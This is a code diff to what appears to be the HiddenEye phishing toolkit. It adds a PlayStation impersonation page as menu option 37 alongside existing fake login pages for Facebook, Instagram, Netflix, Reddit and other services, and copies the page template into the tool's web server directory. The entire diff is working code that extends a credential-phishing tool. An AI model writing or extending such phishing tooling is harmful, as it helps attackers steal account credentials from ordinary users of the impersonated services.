@@ -124,6 +124,8 @@ def runPhishing(page , customOption): #Phishing pages selection menu
         copy_tree("WebPages/Reddit-old/", "Server/www/")
     elif page == 'Subitoit':
         copy_tree("WebPages/subitoit/", "Server/www/")
+    elif page == 'PlayStation':
+        copy_tree('WebPages/playstation/', "Server/www/")
 
     else:
        endMessage()
@@ -381,6 +383,7 @@ def mainMenu():
     print (_(" {0}[{1}7{0}]{1} Twitter         {0}[{1}16{0}]{1} GitLab         {0}[{1}25{0}]{1} Badoo          {0}[{1}34{0}]{1} Yandex").format(MAIN0, MAIN2))                 
     print (_(" {0}[{1}8{0}]{1} Instagram       {0}[{1}17{0}]{1} Netflix        {0}[{1}26{0}]{1} CryptoCurrency {0}[{1}35{0}]{1} Reddit").format(MAIN0, MAIN2))
     print (_(" {0}[{1}9{0}]{1} Snapchat        {0}[{1}18{0}]{1} Origin         {0}[{1}27{0}]{1} DevianArt      {0}[{1}36{0}]{1} SUbito.it").format(MAIN0, MAIN2))
+    print (_(" {0}[{1}37{0}]{1} PlayStation        ").format(MAIN0, MAIN2))
     option = input(_("{0}HiddenEye >>>  {1}").format(MAIN0, MAIN2))
     if option == '1':
         loadModule('Facebook')
@@ -526,6 +529,10 @@ def mainMenu():
         loadModule('Subitoit')
         customOption = ''
         runPhishing('Subitoit', customOption)
+    elif option == '37':
+        loadModule('PlayStation')
+        customOption = ''
+        runPhishing('PlayStation', customOption)
 
     else:
         endMessage()
